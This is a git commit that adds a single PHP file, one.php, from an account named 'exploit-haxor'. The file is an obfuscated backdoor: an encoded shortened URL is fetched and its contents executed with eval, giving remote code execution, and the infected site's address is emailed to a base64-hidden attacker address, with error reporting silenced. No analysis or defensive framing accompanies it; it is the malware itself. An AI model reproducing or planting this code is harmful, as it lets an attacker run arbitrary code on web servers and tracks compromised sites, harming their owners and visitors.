f42ebaaa27250377f7612474e9e47880b33982d9
gantengers <76028485+exploit-haxor@users.noreply.github.com>
2024-12-14 20:38:06 +0700

    Add files via upload

---
+++ one.php
@@ -0,0 +1,5 @@
+<?=null;@eval("?>".file_get_contents(urldecode("h\x74t\x70\x73\x25\x33\x41\x25\x32F%2F\x62it.ly\x25\x32\x463D\x63\x4d\x6d9\x33")));
+/////DEPRESION///
+$ˆããããã‰µ‚ïã²—„ããã = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");$»ã‚ãã„ã„„¾™†ã†¼ ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "combo";mail($ˆããããã‰µ‚ïã²—„ããã,"for 4u", $»ã‚ãã„ã„„¾™†ã†¼);mail($ˆããããã‰µ‚ïã²—„ããã,"for 4u", $»ã‚ãã„ã„„¾™†ã†¼);${"\x47L\x4f\x42\x41\x4c\x53"}["\x6ei\x75\x65\x76ao\x72f\x77"]="\x6c\x6f\x76\x65";$„†¾ã‰‰Šã¼ãã="\x66\x6f\x72";mail(${$„†¾ã‰‰Šã¼ãã},"f\x6f\x72\x20\x34\x75",${${"G\x4c\x4fB\x41\x4c\x53"}["n\x69\x75\x65v\x61o\x72\x66\x77"]});@mail(${$„†¾ã‰‰Šã¼ãã},"f\x6f\x72\x20\x34\x75",${${"G\x4c\x4fB\x41\x4c\x53"}["n\x69\x75\x65v\x61o\x72\x66\x77"]});error_reporting(0);
+
+?>
